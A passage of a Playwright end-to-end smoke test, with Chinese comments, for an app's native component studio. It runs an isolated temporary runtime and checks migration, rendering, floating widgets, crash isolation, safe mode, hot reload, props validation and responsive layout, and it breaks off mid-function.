// 原生组件冒烟（A7 S4 起，计划 §6 S4–S5）：真实生产构建 + 隔离的临时 Runtime（数据目录在临时目录里，不连模型、不写真实数据）。
// 种子：手放的原生组件、会抛错的原生组件、一个旧版 iframe 组件（启动迁移应把它移进回收站，负责人决定），
// 启动后再放一个坏目录；经 API 建 feature-page 与 floating 实例。覆盖：
// - 组件页（S4 过渡版）只列原生行与坏目录行，没有旧版行；旧组件文件原样在 custom-ui-trash 里
// - 预览在真实 ComponentHost 里渲染（htm 模板）；/tools/components/:id 整页渲染 feature-page 实例
// - 浮窗渲染、拖动后位置写进 pisper-floating-placement、关闭 = 实例 PATCH enabled:false
// - 崩溃隔离：错误卡 → 60 秒内 3 次后“已暂停” → 恢复
// - ?safe-mode=components 下只显示占位卡；安全模式哨兵还在时先询问，选“正常加载”后才加载
// - 热重载：改写 component.js 后预览内容随 rev 更新
// - 坏目录行可删除（移入回收站）；1440 与 1080 宽都没有横向滚动
// S5 组件工作室：进入时侧栏收成窄轨、离开后回到偏好；1440 三栏、1080 设置栏改为抽屉；
// 从模板新建「便签」没有默认放置，经放置磁贴放到功能页与浮窗、再移出；属性非法值被 Runtime 拒绝并定位到字段，
// 改对后保存进实例；源码页与日志页；深色主题下渲染（手机列表 → 详情见 smoke-mobile-shell）。
// S6 放置宿主：没有总览实例时全部代理页没有组件栏；1440 右侧 320 栏里 S 卡内容区 320×120、M 卡 320×248，
// ⋯ → 换个位置把卡片移到功能页；1080×680（自绘标题栏）收成页头“组件 N”弹层，右上 144px 不被挡、没有横向滚动；
// 会话检查器的组件标签按实例范围过滤（其他项目的实例不出现），“+”里改为“仅此项目”后出现并选中，
// ctx.session 是当前会话，方向键在固定标签与组件标签之间移动（手机末尾全宽与浮窗不显示见 smoke-mobile-shell）。
// S7 代理生成闭环：提示词卡片 ⌘↵ → 绑定会话（消息以 '/skill:pisper-component ' 开头，拦截 /api/chat、不连模型）
// 出现在侧栏“运行中”；错误卡 [让代理修复] 带错误摘要；“空白 + 描述”新建后交给代理生成。
// 浏览器模拟不等于 Tauri / WebView2 或真机验证。
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { existsSync } from 'node:fs'
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { strToU8, unzipSync, zipSync } from 'fflate'
import { chromium } from 'playwright-core'
import {
  BOARD_SESSION_ID,
  BOARD_SESSION_TITLE,
  desktopBridgeScript,
  writeBoardSessionFixture,
} from './fixtures/board-fixture.mjs'
import { fetchIdempotent } from './fixtures/route-fetch.mjs'
import { SMOKE_BROWSER } from './fixtures/smoke-browser.mjs'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const output = await mkdtemp(join(tmpdir(), 'pisper-components-'))
const dataDir = join(output, 'agent')
const workspace = join(output, 'workspace')
const fixtureHome = join(output, 'home')
await mkdir(workspace)
await mkdir(fixtureHome)
// 所有 CLI 扫描限于空的隔离 home；组件、实例与偏好只写进这个临时目录。
process.env.HOME = fixtureHome
process.env.USERPROFILE = fixtureHome
process.env.CODEX_HOME = join(fixtureHome, '.codex')
process.env.CLAUDE_CONFIG_DIR = join(fixtureHome, '.claude')
process.env.PI_SKIP_VERSION_CHECK = '1'
process.env.PI_TELEMETRY = '0'
process.env.PISPER_AGENT_DIR = dataDir
process.env.PISPER_WORKSPACE_DIR = workspace

const componentsRoot = join(dataDir, 'custom-ui')
async function writeComponent(id, manifest, source) {
  const dir = join(componentsRoot, id)
  await mkdir(dir, { recursive: true })
  await writeFile(join(dir, 'manifest.json'), JSON.stringify(manifest))
  if (source !== undefined) await writeFile(join(dir, 'component.js'), source)
  return dir
}
const cardSource = (label) =>
  [
    'export default function Card({ ctx, placement }) {',
    `  return ctx.html\`<div data-fixture-ok="${label}" style=\${{ padding: '12px', color: 'var(--content)' }}>`,
    `    <strong>原生卡片 ${label}</strong> <span>\${placement.surface}</span>`,
    '  </div>`',
    '}',
    '',
  ].join('\n')
await writeComponent(
  'native-ok',
  {
    runtime: 'native',
    name: '原生卡片',
    version: '1.0.0',
    description: '手放的原生组件',
    placements: [{ surface: 'feature-page' }, { surface: 'floating', size: { w: 300, h: 140 } }],
  },
  cardSource('v1'),
)
await writeComponent(
  'crasher',
  {
    runtime: 'native',
    name: '会崩溃的组件',
    version: '0.1.0',
    placements: [{ surface: 'feature-page' }],
  },
  "export default function Crash() {\n  throw new Error('fixture crash')\n}\n",
)
await writeComponent(
  'props-card',
  {
    runtime: 'native',
    name: '属性卡片',
    version: '1.0.0',
    placements: [{ surface: 'feature-page' }],
    props: {
      type: 'object',
      properties: {
        label: { type: 'string', title: '标签', maxLength: 20 },
        interval: { type: 'integer', title: '间隔', minimum: 10, maximum: 600, 'x-unit': '秒' },
      },
    },
  },
  [
    'export default function Props({ ctx, props }) {',
    "  return ctx.html`<p data-fixture-props=${String(props.interval ?? '')}>${props.label ?? ''}</p>`",
    '}',
    '',
  ].join('\n'),
)
const legacyDir = await writeComponent('legacy-old', {
  name: '旧版组件',
  entry: 'index.html',
  permissions: ['notify'],
})
await writeFile(join(legacyDir, 'index.html'), '<!doctype html><body>legacy</body>')
// S6：一条真实会话（项目 = workspace），会话检查器的组件标签按它的项目过滤。
await writeBoardSessionFixture(join(dataDir, 'sessions'), workspace)

const { createPisperRuntime } = await import('../runtime/app-runtime.mjs')
const app = await createPisperRuntime({
  root,
  frontendRoot: join(root, 'dist'),
  runtimeCwd: workspace,
  dataDir,
  production: true,
  port: 0,
  host: '127.0.0.1',
  remote: { enabled: false },
})
await app.initialized
const base = app.url
const report = { status: 'running', checks: [], pageErrors: [] }
let browser
let failurePage

// 经页面调用 Runtime API：带着页面的桌面 Cookie，走与界面同一条鉴权链。
const api = (page, method, path, body) =>
  page.evaluate(
    async ({ method, path, body }) => {
      const response = await fetch(path, {
        method,
        headers: body === undefined ? {} : { 'Content-Type': 'application/json' },
        body: body === undefined ? undefined : JSON.stringify(body),
      })
      return { status: response.status, body: await response.json().catch(() => null) }
    },
    { method, path, body },
  )

async function newContext(options = {}, { initScripts = [] } = {}) {
  const context = await browser.newContext({ locale: 'zh-CN', deviceScaleFactor: 1, ...options })
  await context.addInitScript(() => {
    try {
      localStorage.setItem('pisper-language', 'zh-CN')
      localStorage.setItem('pisper-model-onboarding-v1-dismissed', '1')
    } catch {}
  })
  for (const [script, arg] of initScripts) await context.addInitScript(script, arg)
  await context.addInitScript(desktopBridgeScript)
  // 不装看板固定数据：组件热重载靠真实 Runtime 的 /api/board/events（component_changed）。
  await context.route('**/api/app-update*', (route) =>
    route.fulfill({ json: { state: 'current', checkedAt: Date.now() } }),
  )
  return context
}

async function openPage(context, label, hash) {
  const page = await context.newPage()
  failurePage = page
  page.on('pageerror', (error) => report.pageErrors.push(`${label}: ${error.message}`))
  await page.goto(`${base}/${hash}`)
  return page
}

const noHorizontalScroll = (page) =>
  page.evaluate(
    () => document.documentElement.scrollWidth <= document.documentElement.clientWidth + 1,
  )

async function settle(page) {
  await page.evaluate(
    () => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))),
  )
  await page.waitForTimeout(200)
}

try {
  browser = await chromium.launch({
    headless: true,
    ...(SMOKE_BROWSER
      ? { executablePath: SMOKE_BROWSER }
      : process.platform === 'win32'
        ? { channel: 'msedge' }
        : {}),
  })

  // 1. 启动迁移：旧版组件已移进回收站，文件原样保留；原生组件不动。
  assert.equal(existsSync(legacyDir), false, 'legacy component moved out of custom-ui/')
  const trashed = (await readdir(join(dataDir, 'custom-ui-trash'))).filter((name) =>
    name.startsWith('legacy-old-'),
  )
  assert.equal(trashed.length, 1)
  assert.match(
    await readFile(join(dataDir, 'custom-ui-trash', trashed[0], 'component', 'index.html'), 'utf8'),
    /legacy/,
  )
  assert.ok(existsSync(join(componentsRoot, 'native-ok', 'component.js')))
  report.checks.push(
    'Startup migration moved the legacy iframe component to custom-ui-trash (files intact) and left native components alone',
  )

  const context = await newContext({ viewport: { width: 1440, height: 900 } })
  // 直接打开原生卡片：列表按名称排序，不带 id 时默认选中第一行（会崩溃的组件），会提前计一次崩溃。
  const page = await openPage(context, 'studio', '#/components/native-ok')

  // 2. 组件页：原生行（含会崩溃的组件），没有旧版行；预览在真实宿主里渲染。
  await page.locator('[data-component-row="native-ok"]').waitFor({ timeout: 60_000 })
  assert.deepEqual(
    (
      await page
        .locator('[data-component-row]')
        .evaluateAll((nodes) =>
          nodes.map((node) => `${node.dataset.componentRow}:${node.dataset.componentKind}`),
        )
    ).sort(),
    ['crasher:native', 'native-ok:native', 'props-card:native'],
  )
  await page.locator('[data-component-row="native-ok"]').click()
  await page.locator('[data-component-preview] [data-fixture-ok="v1"]').waitFor({ timeout: 30_000 })
  assert.equal(await noHorizontalScroll(page), true)
  await page.screenshot({ path: join(output, 'studio-1440.png') })
  report.checks.push(
    'Studio lists native rows only; the preview renders through ComponentHost + htm',
  )

  // 3. 经 API 放置：feature-page 与 floating 实例。
  const created = []
  for (const surface of ['feature-page', 'floating']) {
    const result = await api(page, 'POST', '/api/custom-ui/instances', {
      componentId: 'native-ok',
      surface,
    })
    assert.equal(result.status, 201, JSON.stringify(result))
    created.push(result.body.instance)
  }
  const floatingId = created[1].instanceId

  // 4. 浮窗：渲染、拖动、关闭。
  const floating = page.locator(`[data-floating-widget="${floatingId}"]`)
  // 同一组件同时在预览与浮窗里渲染：两个实例互不影响。工作室里浮窗层隐藏但仍挂着（评审返修）。
  await floating.locator('[data-fixture-ok="v1"]').waitFor({ state: 'attached', timeout: 30_000 })
  await page.locator('[data-component-preview] [data-fixture-ok="v1"]').waitFor({ timeout: 10_000 })
  assert.equal(await page.locator('[data-floating-custom-ui]').isHidden(), true)
  // 离开工作室：同一个实例原样出现（没有重挂）。
  await page.goto(`${base}/#/more`)
  await floating.locator('[data-fixture-ok="v1"]').waitFor({ timeout: 30_000 })
  const before = await floating.boundingBox()
  // 没有保存位置时停在右下角，不压住页头与第一屏内容（评审返修）；底部让出输入框区（底边在视口底 160px 以上）。
  const viewport = page.viewportSize()
  assert.ok(
    before.x + before.width >= viewport.width - 40 &&
      before.y + before.height <= viewport.height - 160 &&
      before.y + before.height >= viewport.height - 220,
    `floating default ${JSON.stringify(before)}`,
  )
  const handle = floating.locator('[data-floating-move]')
  const handleBox = await handle.boundingBox()
  await page.mouse.move(handleBox.x + handleBox.width / 2, handleBox.y + handleBox.height / 2)
  await page.mouse.down()
  // 未定位的浮窗默认在右下角（评审返修），往左上拖。
  await page.mouse.move(handleBox.x - 120, handleBox.y - 80, { steps: 8 })
  await page.mouse.up()
  await settle(page)
  const after = await floating.boundingBox()
  assert.ok(
    Math.abs(after.x - before.x) > 40 && Math.abs(after.y - before.y) > 30,
    `floating moved ${JSON.stringify({ before, after })}`,
  )
  // 浮窗不进标题栏下沿以上（48px），也不撑出横向滚动。
  assert.ok(after.y >= 48, `floating top ${after.y}`)
  const saved = await page.evaluate(() => localStorage.getItem('pisper-floating-placement'))
  assert.ok(saved?.includes(`desktop:${floatingId}`), saved)
  assert.equal(await noHorizontalScroll(page), true)
  await page.screenshot({ path: join(output, 'floating-1440.png') })
  await floating.locator('[data-floating-close]').click()
  await floating.waitFor({ state: 'detached' })
  const instances = await api(page, 'GET', '/api/custom-ui/instances')
  assert.equal(
    instances.body.instances.find((entry) => entry.instanceId === floatingId)?.enabled,
    false,
  )
  report.checks.push(
    'Floating instance stays mounted but hidden in the studio, shows elsewhere in the bottom-right corner, drags (position saved under the instanceId) and closing PATCHes enabled:false',
  )
  await page.goto(`${base}/#/components/native-ok`)
  await page.locator('[data-component-preview] [data-fixture-ok="v1"]').waitFor({ timeout: 30_000 })

  // 5. 崩溃隔离：错误卡；“重新加载”两次（共 3 次崩溃）→ 已暂停；恢复后再次渲染（又一张错误卡）。
  await page.locator('[data-component-row="crasher"]').click()
  const crashHost = page.locator('[data-component-preview] [data-component-host="crasher"]')
  await crashHost.getByRole('button', { name: '重新加载' }).waitFor({ timeout: 30_000 })
  assert.match(await crashHost.textContent(), /渲染出错，已隔离此组件/)
  for (let round = 0; round < 2; round += 1) {
    await crashHost.getByRole('button', { name: '重新加载' }).click()
    await settle(page)
  }
  await page
    .locator(
      '[data-component-preview] [data-component-host="crasher"][data-component-state="paused"]',
    )
    .waitFor({ timeout: 10_000 })
  assert.match(await crashHost.textContent(), /已暂停/)
  await crashHost.getByRole('button', { name: '恢复' }).click()
  await crashHost.getByRole('button', { name: '重新加载' }).waitFor({ timeout: 10_000 })
  // 隔离：同一页上的其他组件不受影响（浮窗已关，这里看整页宿主）。
  report.checks.push(
    'A crashing component shows an isolated error card, pauses after 3 crashes in 60s and resumes on demand',
  )

  // 6. 功能页整页宿主：/tools/components/native-ok 渲染 feature-page 实例；功能索引“我的组件”列出它。
  await page.goto(`${base}/#/more`)
  await page.locator('[data-more-tile="component:native-ok"]').waitFor({ timeout: 30_000 })
  await page.locator('[data-more-tile="component:native-ok"]').click()
  await page.waitForURL((url) => url.hash === '#/tools/components/native-ok')
  await page
    .locator('[data-feature-page-host="native-ok"] [data-fixture-ok="v1"]')
    .waitFor({ timeout: 30_000 })
  assert.match(
    await page.locator('[data-feature-page-host="native-ok"]').textContent(),
    /feature-page/,
  )
  assert.equal(await noHorizontalScroll(page), true)
  await page.screenshot({ path: join(output, 'feature-page-1440.png') })
  // 没有放到功能页的组件：如实说明，给出“在工作室打开”。
  await page.goto(`${base}/#/tools/components/crasher`)
  await page.getByText('这个组件没有放到功能页').waitFor({ timeout: 30_000 })
  report.checks.push(
    'Features › My components lists the feature-page instance and /tools/components/:id renders it; unplaced components say so',
  )

  // 7. 热重载：改写 component.js → 文件监听 → component_changed → 新 rev → 预览重挂。
  await page.goto(`${base}/#/components/native-ok`)
  await page.locator('[data-component-preview] [data-fixture-ok="v1"]').waitFor({ timeout: 30_000 })
  await writeFile(join(componentsRoot, 'native-ok', 'component.js'), cardSource('v2'))
  await page.locator('[data-component-preview] [data-fixture-ok="v2"]').waitFor({ timeout: 30_000 })
  // 页头“已热重载 · N 秒前”（中性灰，不用绿色）。
  assert.match(await page.locator('[data-studio-reloaded]').textContent(), /已热重载 · \d+ 秒前/)
  report.checks.push(
    'Hot reload: rewriting component.js updates the preview through the watcher and a new rev',
  )

  // 8. 启动后手放的坏目录：可见（无法读取）、可删除（移入回收站）。
  await mkdir(join(componentsRoot, 'broken-dir'), { recursive: true })
  await writeFile(join(componentsRoot, 'broken-dir', 'notes.txt'), 'keep me')
  const brokenRow = page.locator('[data-component-row="broken-dir"][data-component-kind="broken"]')
  await brokenRow.waitFor({ timeout: 30_000 })
  await brokenRow.click()
  await page.locator('[data-component-stage="broken-dir"] [data-component-errors]').waitFor()
  // 删除在设置栏吸底的 ⋯ 菜单里（规格 5.1）。
  await page.locator('[data-studio-settings] [data-component-more]').click()
  await page.locator('[role="menuitem"][data-component-delete]').click()
  await page.locator('[data-component-delete-confirm]').click()
  await brokenRow.waitFor({ state: 'detached', timeout: 30_000 })
  assert.equal(existsSync(join(componentsRoot, 'broken-dir')), false)
  const brokenTrash = (await readdir(join(dataDir, 'custom-ui-trash'))).find((name) =>
    name.startsWith('broken-dir-'),
  )
  assert.ok(brokenTrash, 'broken directory moved to the trash')
  assert.equal(
    await readFile(join(dataDir, 'custom-ui-trash', brokenTrash, 'component', 'notes.txt'), 'utf8'),
    'keep me',
  )
  report.checks.push(
    'A broken directory dropped in after startup is listed as unreadable and can be deleted into the trash',
  )

  // S5-1. 三栏与窄轨：1440 时设置栏并排；侧栏只在工作室里收成窄轨，偏好没被改写。
  await page.goto(`${base}/#/components/native-ok`)
  await page
    .locator('[data-component-studio][data-studio-settings-mode="inline"] [data-studio-settings]')
    .waitFor({ timeout: 30_000 })
  assert.equal(
    await page.locator('[data-shell-sidebar]').getAttribute('data-shell-sidebar'),
    'rail',
  )
  assert.equal(await noHorizontalScroll(page), true)
  report.checks.push('Studio at 1440: three columns with inline settings and the sidebar railed')

  // S5-2. 从模板新建「便签」：选中新行，没有任何放置（规格 5.2：没有默认位置）。
  await page.locator('[data-component-new]').click()
  await page.locator('[data-component-new-template="notes"]').click()
  await page.waitForURL((url) => url.hash === '#/components/notes', { timeout: 30_000 })
  await page.locator('[data-component-row="notes"][aria-current="true"]').waitFor()
  const notesInstances = async () =>
    (await api(page, 'GET', '/api/custom-ui/instances')).body.instances.filter(
      (entry) => entry.componentId === 'notes',
    )
  assert.deepEqual(await notesInstances(), [])
  assert.match(
    await page.locator('[data-component-row="notes"] [data-component-row-detail]').textContent(),
    /未放置/,
  )
  // 便签声明了存储：预览里加载出 textarea（ctx.storage 走真实 Runtime）。
  await page.locator('[data-component-preview] textarea').waitFor({ timeout: 30_000 })

  // S5-3. 放置磁贴：功能页 + 浮窗；浮窗真的出现；再从磁贴移出浮窗（实例删除）。
  for (const surface of ['feature-page', 'floating']) {
    await page.locator(`[data-placement-tile="${surface}"] button[role="checkbox"]`).click()
    await page.locator(`[data-placement-tile="${surface}"][data-placement-checked]`).waitFor()
  }
  const placedNotes = await notesInstances()
  assert.deepEqual(placedNotes.map((entry) => entry.surface).sort(), ['feature-page', 'floating'])
  const notesFloating = placedNotes.find((entry) => entry.surface === 'floating')
  // 工作室里浮窗层隐藏：实例挂着（textarea 已渲染），只是不可见。
  await page
    .locator(`[data-floating-widget="${notesFloating.instanceId}"] textarea`)
    .waitFor({ state: 'attached', timeout: 30_000 })
  assert.match(
    await page.locator('[data-component-row="notes"] [data-component-row-detail]').textContent(),
    /功能页 · 浮窗/,
  )
  await page.locator('[data-placement-tile="floating"] button[role="checkbox"]').click()
  await page
    .locator(`[data-floating-widget="${notesFloating.instanceId}"]`)
    .waitFor({ state: 'detached', timeout: 30_000 })
  assert.deepEqual(
    (await notesInstances()).map((entry) => entry.surface),
    ['feature-page'],
  )
  report.checks.push(
    'New from the 便签 template creates no placement; tiles place it on the feature page and as a floating widget (rendered), and unchecking removes the floating one',
  )

  // S5-4. 属性：放到功能页后编辑实例属性；越界值被 Runtime 拒绝并定位到字段，改对后保存进实例。
  await page.locator('[data-component-row="props-card"]').click()
  await page.locator('[data-placement-tile="feature-page"] button[role="checkbox"]').click()
  await page.locator('[data-placement-tile="feature-page"][data-placement-checked]').waitFor()
  const propsInstance = async () =>
    (await api(page, 'GET', '/api/custom-ui/instances')).body.instances.find(
      (entry) => entry.componentId === 'props-card',
    )
  const propsId = (await propsInstance()).instanceId
  await page.locator(`[data-props-form="${propsId}"]`).waitFor()
  const intervalField = page.locator('[data-props-field$="-interval"]')
  await intervalField.locator('input').fill('5')
  await page.locator('[data-props-field$="-label"] input').fill('冒烟')
  await page.locator('[data-props-save]').click()
  await intervalField.locator('[data-props-error]').waitFor({ timeout: 10_000 })
  assert.match(await intervalField.locator('[data-props-error]').textContent(), /超出允许的范围/)
  assert.equal(await intervalField.locator('input').getAttribute('aria-invalid'), 'true')
  assert.deepEqual((await propsInstance()).props, {}, 'rejected props are not saved')
  await intervalField.locator('input').fill('30')
  await page.locator('[data-props-save]').click()
  await page.waitForFunction(() => !document.querySelector('[data-props-error]'), undefined, {
    timeout: 10_000,
  })
  await page.waitForTimeout(300)
  assert.deepEqual((await propsInstance()).props, { label: '冒烟', interval: 30 })
  await page.locator('[data-component-preview] [data-fixture-props="30"]').waitFor()
  report.checks.push(
    'Props form: an out-of-range value is rejected by the Runtime and pinned to its field; the corrected values save into the instance and the preview follows',
  )

  // S5-5. 源码与日志。
  await page.getByRole('radio', { name: '源码' }).click()
  await page
    .locator('[data-studio-source-code="component.js"]')
    .filter({ hasText: 'export default function Props' })
    .waitFor({ timeout: 30_000 })
  await page.getByRole('radio', { name: '日志' }).click()
  await page.locator('[data-studio-logs]').waitFor()
  await page.getByRole('radio', { name: '预览' }).click()
  report.checks.push('Source view reads files by rev; the log view opens')

  // 9. 1080 宽：没有横向滚动。
  await page.setViewportSize({ width: 1080, height: 680 })
  await settle(page)
  assert.equal(await noHorizontalScroll(page), true)
  await page.screenshot({ path: join(output, 'studio-1080.png') })
  // 1080：设置栏放不下，改为抽屉；页头按钮打开，Esc 关闭。
  await page.locator('[data-studio-settings-mode="drawer"]').waitFor()
  assert.equal(await page.locator('[data-studio-settings]').count(), 0)
  // 键盘打开（聚焦 [设置] 按 Enter），Esc 关闭后焦点回到 [设置]（评审返修：原来落到 body）。
  await page.locator('[data-studio-settings-open]').focus()
  await page.keyboard.press('Enter')
  await page.locator('[data-studio-settings-drawer] [data-studio-settings]').waitFor()
  assert.equal(await noHorizontalScroll(page), true)
  await page.keyboard.press('Escape')
  await page.locator('[data-studio-settings-drawer]').waitFor({ state: 'detached' })
  await page.waitForFunction(() =>
    document.activeElement?.hasAttribute('data-studio-settings-open'),
  )
  report.checks.push(
    'No horizontal scroll at 1080×680; settings move into a drawer opened from the keyboard, and Esc returns focus to [设置]',
  )

  // 离开工作室：侧栏回到偏好（默认展开）。
  await page.setViewportSize({ width: 1440, height: 900 })
  await page.goto(`${base}/#/more`)
  await page.locator('[data-shell-sidebar="expanded"]').waitFor({ timeout: 30_000 })
  report.checks.push('Leaving the studio restores the expanded sidebar')
  // 安全模式哨兵在初始实例提交 3 秒后才清掉（经 /api/local 同步到 Runtime）：等它清掉再关，
  // 否则下一个上下文会读到“上次加载组件时可能卡死”的询问。
  await page.waitForTimeout(3_500)
  await context.close()

  // 深色主题：工作室照常渲染，预览跟随应用主题。
  const darkContext = await newContext({
    viewport: { width: 1440, height: 900 },
    colorScheme: 'dark',
  })
  const darkPage = await openPage(darkContext, 'dark', '#/components/native-ok')
  await darkPage
    .locator('[data-component-preview] [data-fixture-ok="v2"]')
    .waitFor({ timeout: 60_000 })
  assert.equal(
    await darkPage.evaluate(() => document.documentElement.classList.contains('dark')),
    true,
  )
  assert.equal(await noHorizontalScroll(darkPage), true)
  await darkPage.screenshot({ path: join(output, 'studio-1440-dark.png') })
  // 预览挂载后等哨兵清掉（3 秒）再关，免得下一个上下文读到“上次可能卡死”。
  await darkPage.waitForTimeout(3_500)
  await darkContext.close()
  report.checks.push('Dark theme: the studio and its preview render without horizontal scroll')

  // 10. ?safe-mode=components：所有原生组件只显示占位卡。
  const safeContext = await newContext({ viewport: { width: 1440, height: 900 } })
  const safePage = await openPage(
    safeContext,
    'safe-mode',
    '?safe-mode=components#/components/native-ok',
  )
  await safePage
    .locator(
      '[data-component-preview] [data-component-host="native-ok"][data-component-state="safe-mode"]',
    )
    .waitFor({ timeout: 60_000 })
  assert.equal(await safePage.locator('[data-fixture-ok]').count(), 0)
  await safePage.goto(`${base}/?safe-mode=components#/tools/components/native-ok`)
  await safePage
    .locator('[data-feature-page-host="native-ok"] [data-component-state="safe-mode"]')
    .waitFor({ timeout: 30_000 })
  assert.equal(await safePage.locator('[data-fixture-ok]').count(), 0)
  await safeContext.close()
  report.checks.push('?safe-mode=components shows placeholders only')

  // 11. 上次启动留下的安全模式哨兵：先询问（不加载组件），选“正常加载”后才渲染。
  const sentinel = JSON.stringify({
    loading: { at: new Date().toISOString(), instanceIds: [created[0].instanceId] },
  })
  // 哨兵经 /api/local 同步到 Runtime（启动时以 Runtime 的版本为准）：直接写进 Runtime 镜像，
  // 再整页重新加载，模拟“上次启动加载组件时卡死”。只往 localStorage 写会被更新的镜像版本覆盖。
  const promptContext = await newContext({ viewport: { width: 1440, height: 900 } })
  const promptPage = await promptContext.newPage()
  failurePage = promptPage
  promptPage.on('pageerror', (error) => report.pageErrors.push(`prompt: ${error.message}`))
  await promptPage.goto(`${base}/#/more`)
  await promptPage.locator('[data-shell-sidebar]').waitFor({ timeout: 60_000 })
  const stored = await promptPage.evaluate(async (value) => {
    const revision = Date.now() * 1000 + 1_000_000
    const response = await fetch('/api/local/browser-preferences', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        updates: { 'pisper-components-safe-mode': value },
        revisions: { 'pisper-components-safe-mode': revision },
      }),
    })
    return response.status
  }, sentinel)
  assert.ok(stored >= 200 && stored < 300, `sentinel stored ${stored}`)
  await promptPage.goto(`${base}/#/tools/components/native-ok`)
  await promptPage.reload()
  await promptPage.locator('[data-components-safe-mode-prompt]').waitFor({ timeout: 60_000 })
  await promptPage
    .locator('[data-feature-page-host="native-ok"] [data-component-state="safe-mode"]')
    .waitFor({ timeout: 30_000 })
  assert.equal(await promptPage.locator('[data-fixture-ok]').count(), 0)
  await promptPage.getByRole('button', { name: '正常加载' }).click()
  await promptPage
    .locator('[data-feature-page-host="native-ok"] [data-fixture-ok="v2"]')
    .waitFor({ timeout: 30_000 })
  // 正常加载后哨兵重新写入，3 秒后清掉：等它清掉再关，下一个上下文不会再被询问。
  await promptPage.waitForTimeout(3_500)
  await promptContext.close()
  report.checks.push(
    'A stale safe-mode sentinel asks first (components stay as placeholders) and loads normally after “正常加载”',
  )

  // 12. S6 放置宿主：全部代理右栏 / 页头弹层（overview-card）、会话检查器组件标签与“+”（session-panel）。
  await writeComponent(
    'panel-card',
    {
      runtime: 'native',
      name: '面板卡片',
      version: '1.0.0',
      placements: [
        { surface: 'overview-card', sizes: ['S', 'M'] },
        { surface: 'session-panel' },
        { surface: 'feature-page' },
      ],
    },
    [
      'export default function Panel({ ctx, placement, size }) {',
      "  return ctx.html`<div data-fixture-panel=${placement.surface} data-size=${size.width + 'x' + size.height} data-session=${ctx.session ? ctx.session.title : ''} style=${{ padding: '8px' }}>面板 ${placement.surface}</div>`",
      '}',
      '',
    ].join('\n'),
  )
  const hostContext = await newContext({ viewport: { width: 1440, height: 900 } })
  const hostPage = await openPage(hostContext, 'hosts', '#/board')
  await hostPage.locator('[data-overview]').waitFor({ timeout: 60_000 })
  // 手放的组件经文件监听出现在目录里（默认启用）。
  for (let attempt = 0; ; attempt += 1) {
    const catalog = await api(hostPage, 'GET', '/api/custom-ui/components')
    const row = catalog.body?.components?.find((entry) => entry.id === 'panel-card')
    if (row?.status === 'ready' && row.enabled) break
    assert.ok(attempt < 60, `panel-card never became ready: ${JSON.stringify(row)}`)
    await hostPage.waitForTimeout(250)
  }
  // 没有总览实例：没有组件栏、没有“组件 N”，页面与以前一样（列表最大 880 居中）。
  await settle(hostPage)
  assert.equal(await hostPage.locator('[data-overview-widgets]').count(), 0)
  assert.equal(await hostPage.locator('[data-overview-components-trigger]').count(), 0)
  const cards = []
  for (const size of ['S', 'M']) {
    const result = await api(hostPage, 'POST', '/api/custom-ui/instances', {
      componentId: 'panel-card',
      surface: 'overview-card',
      size,
    })
    assert.equal(result.status, 201, JSON.stringify(result))
    cards.push(result.body.instance.instanceId)
  }
  const column = hostPage.locator('aside[data-overview-widgets="column"]')
  await column.locator('[data-fixture-panel="overview-card"]').nth(1).waitFor({ timeout: 30_000 })
  const cardBoxes = await column.evaluate((aside) => ({
    aside: Math.round(aside.getBoundingClientRect().width),
    cards: [...aside.querySelectorAll('[data-overview-component]')].map((card) => {
      const body = card.querySelector('[data-overview-component-body]').getBoundingClientRect()
      return {
        size: card.dataset.overviewComponentSize,
        body: `${Math.round(body.width)}x${Math.round(body.height)}`,
        ctx: card.querySelector('[data-fixture-panel]')?.dataset.size,
        title: card.querySelector('h3')?.textContent,
      }
    }),
  }))
  assert.deepEqual(cardBoxes, {
    aside: 320,
    cards: [
      { size: 'S', body: '320x120', ctx: '320x120', title: '面板卡片' },
      { size: 'M', body: '320x248', ctx: '320x248', title: '面板卡片' },
    ],
  })
  assert.equal(await noHorizontalScroll(hostPage), true)
  await hostPage.screenshot({ path: join(output, 'overview-1440.png') })
  report.checks.push(
    'All agents at 1440: no component column without overview instances; with them a 320 column whose S / M content areas are 320×120 / 320×248 (ctx.size matches), host-drawn headers, no horizontal scroll',
  )

  // ⋯ → 换个位置 → 功能页：先放到功能页，成功后才移出这张卡（属性一起带过去）。
  await column
    .locator(`[data-overview-component="${cards[0]}"] [data-overview-component-menu]`)
    .click()
  await hostPage.locator('[data-overview-component-move]').click()
  await hostPage.locator('[data-overview-component-move-to="feature-page"]').click()
  await column.locator(`[data-overview-component="${cards[0]}"]`).waitFor({ state: 'detached' })
  const afterMove = (await api(hostPage, 'GET', '/api/custom-ui/instances')).body.instances.filter(
    (entry) => entry.componentId === 'panel-card',
  )
  assert.deepEqual(afterMove.map((entry) => entry.surface).sort(), [
    'feature-page',
    'overview-card',
  ])
  // 再放一张 S，1080 时弹层里有两张。
  const extra = await api(hostPage, 'POST', '/api/custom-ui/instances', {
    componentId: 'panel-card',
    surface: 'overview-card',
    size: 'S',
  })
  assert.equal(extra.status, 201, JSON.stringify(extra))
  // 第三张（M + S + S）：1080×680 的弹层放不下，必须滚动而不是把卡片压扁（评审返修）。
  const third = await api(hostPage, 'POST', '/api/custom-ui/instances', {
    componentId: 'panel-card',
    surface: 'overview-card',
    size: 'S',
  })
  assert.equal(third.status, 201, JSON.stringify(third))
  report.checks.push(
    'Card ⋯ → 换个位置 moves the card to the feature page (new instance first, then the card is removed)',
  )

  // 1080×680（自绘标题栏）：组件栏收进页头“组件 N”弹层；右上 144px 不被挡，没有横向滚动。
  await hostPage.setViewportSize({ width: 1080, height: 680 })
  await settle(hostPage)
  assert.equal(await hostPage.locator('[data-overview-widgets]').count(), 0)
  const trigger = hostPage.locator('[data-overview-components-trigger]')
  await trigger.waitFor({ timeout: 30_000 })
  assert.equal((await trigger.textContent()).trim(), '组件 3')
  await trigger.click()
  const popover = hostPage.locator('[data-overview-components="popover"]')
  await popover.locator('[data-fixture-panel="overview-card"]').nth(2).waitFor({ timeout: 30_000 })
  const layout1080 = await hostPage.evaluate(() => {
    const popover = document.querySelector('[data-overview-components="popover"]')
    const box = popover.getBoundingClientRect()
